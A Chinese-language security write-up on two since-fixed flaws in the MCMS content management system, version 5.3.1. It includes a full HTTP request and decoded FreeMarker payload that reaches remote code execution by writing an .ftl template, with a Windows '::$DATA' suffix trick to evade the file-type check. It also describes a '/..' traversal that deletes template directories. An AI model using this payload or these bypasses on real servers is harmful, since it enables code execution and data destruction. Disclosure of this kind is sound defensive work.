#### 1\. 前言

本篇中版本为5.3.1 在提交后已经修复  
新版已修复且下载地址如下：<https://gitee.com/mingSoft/MCMS>

#### 2\. freeMark模板注入挖掘

在系统设置--模板管理中，可以对文件进行修改  
![](./img/5020070785569677877.png)  
这里以本机Windows为例，通过抓包得知  
为net.mingsoft.basic.action#writeFileContent方法  
![](./img/981169500280530527.png)  
首先会判断传入的文件是否存在，稍后会进行文件后缀的判断  
![](./img/2592616799828099106.png)  
跟进checkFileType，可以发现会对传入的FileName进行判断，如果为以下后缀则上传失败  
![](https://xzfile.aliyuncs.com/media/upload/picture/20230903133934-431ac7e8-4a1c-1.png)  
因为前期发现整合了freeMark，所以直接写入到WEB-INF/manager/cms/目录下的ftl文件即可  
![](./img/4609835986770571581.png)  
直接写入即可：

    
    
    POST /ms/basic/template/writeFileContent.do HTTP/1.1
    Host: 192.168.1.6:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Cache-Control: no-cache
    Pragma: no-cache
    token: null
    Content-Length: 288
    Origin: http://192.168.1.6:8080
    Connection: close
    Referer: http://192.168.1.6:8080/ms/basic/template/list.do?template=1/default
    Cookie: SHIRO_SESSION_ID=1048399f-60a2-4a05-8112-5030a61e69c4; pageno_cookie=1; rememberMe=tUQsvtRus4pdsS5hhhcZRj6w7Kt4QX17kHT57OhAd6YsO44CQrPJRMSTkFg2hdQpkyGItXEbBW85nr5Mb4lQHu/j5crBNIlPDUHvgxi21TAZ/jTHurUXETl+1yRtN2ZEyjAWh/d9pIDydDQjJfbKXr6Uf6t8wD4nYKoiYkAUAs2AZo2PsGk5R0q0x6YNhOetflg8laT6ethhboMIX3SzYLXdVWyzCCM1gmyV9/FTAi02l6gIkrr9Z6ebtmbrtlVAm8rY0vrjJ+Y5Of3k5DJNCkFn/3BWsIS1A/pEqQcs13arYY3cFaf5RNybDiueJpAClViuPdUcNxr/f4AooQgrZiRvjucdfnjw7ml55gvMgddxR5Gx1L8enuTgv2xbpdUxoohUSQOMXHDfex91Qr0s49YTB9yF1j+MTgXcLyiJ8hbj+yMnQzX9QG3tyLLrIVShVz1gdFBFWfxM8BaCa07ZNJ+p49dsy0ntlW2GeEyh7XXQ+P2go3S6B5q2aIIxedfFtj76QnlLlw7XGGvK+uCc+eyhFxdNRBMT55nWieUpEGWSO54dmSrUNn2KqhRQWVt5XyEP2Nw2XSsvWArxg5/fjqIwekHNlXQyyjb/MyvqA22xj4G4P7wFRgf6mcAzv651dOwBKDe1O/8xCiKJdvLMC8Ecl9/J8O49vBEFuQ0UwHNLUoMciO+UfqZr1MVSG7lPAiLE8hJ+GC7l84wptE5p6ahdRcyBb4e1uoa9Ohg5C3eYKUqnMGyD3KOsYySKn7uaiOuWapERuqRc8d2jSQiT4wntiemnB0BZ+7ynsNKMWIHKbZv3oYCX4YtDROPMGovetW1L6LOC9eJ6UqxiI+LUXck53hUyYrE57OvKd8MNxJGvAsAeR6WoaglTbqaXlGsXQuGv4ArApkyt+UBOGU8Wx3zjh0lcHkivVHzekB4DsJflXPZ9L+hxyzSQet3ZzuXC/aWlEpwkxJRCE71gyj0tAKfB97mKOTNWKtuj1XuBsumKyUalE5qMUmi1Mf0qQQYGgvnYwdklu/XIZ3GsaBakIg+zYlGlac1xC5EN63i6Eml5AK/DhnulHu6jkRRysFuYorzVYr7KLIldPTHkDuG+epimts1bpykjEYXWHLKKjzrHo6rSaKU8N421wvmHtW+uUoumnDjOzAS2kiwikgR5rSrwIs0iZkxs66JfohDAOuGFxi0mKbpqGhigj+LIn6xeWmdpJb30Bo8Hdfi14kohySASILzT/peKk+scpmA5IVER1Ih/e1zqZdDJigs1m4mLoCTmb8SiyqQCE1g3CI2Ar4rK1oOerMgn6lB4yUabjyFay0ps07HEWYl3sXRJ4q1bXEqNFOrjhbvNLkc=
    
    fileName=%57%45%42%2d%49%4e%46%5c%6d%61%6e%61%67%65%72%5c%63%6d%73%5c%63%6f%6e%74%65%6e%74%5c%66%6f%72%6d%2e%66%74%6c%3a%3a%24%44%41%54%41&name=about.htm&fileNamePrefix=template%5C1%2F%5Cdefault%5C&fileContent=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22calc%22%29%7D
    

数据包进行了URL编码，内容其实如下。因为无法上传ftl，而且在Windows的环境中，所以使用::$DATA来绕过。  
(
在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，其实和空格绕过点绕过类似)

    
    
    fileName=WEB-INF\manager\cms\content\form.ftl::$DATA&name=about.htm&fileNamePrefix=template\1/\default\&fileContent=${"freemarker.template.utility.Execute"?new()("calc")}

这里我写入的是content\form.ftl文件。  
![](./img/1458725464385708416.png)  
接下来直接找action即可。利用action转发到form页面即可  
位置在net.mingsoft.cms.action#form方法  
![](./img/8139296543886760369.png)  
![](./img/3141748952386235641.png)  
<http://192.168.1.6:8080/ms/cms/content/form> (这里是热部署，实时更新)  
直接rce~  
![](./img/3314684351051518358.png)

#### 3\. 跨目录文件删除

登录后台后，在系统设置--模板管理可以删除文件。而只能删除default目录  
![](./img/3171830324591823770.png)  
当前default路径如下，可以看到在template目录下方。而template有很多其它模板文件  
![](./img/224767957898475302.png)  
在net.mingsoft.basic.action#delete方法中，可以看到回怼传入的fileName进行判断。如果是../或者..\
则跑到247行的error处  
![](./img/1838773832014601622.png)  
所以有一个很好的绕过思路/..来绕过  
![](./img/2339076278222978778.png)  
接下来可以看到template目录下的模板文件全部被删除了。  
![](./img/3185533374117111285.png)  
提交该数据包之后，path如下，这里就会将template模板目录全部删除  
![](./img/1331245464464966027.png)

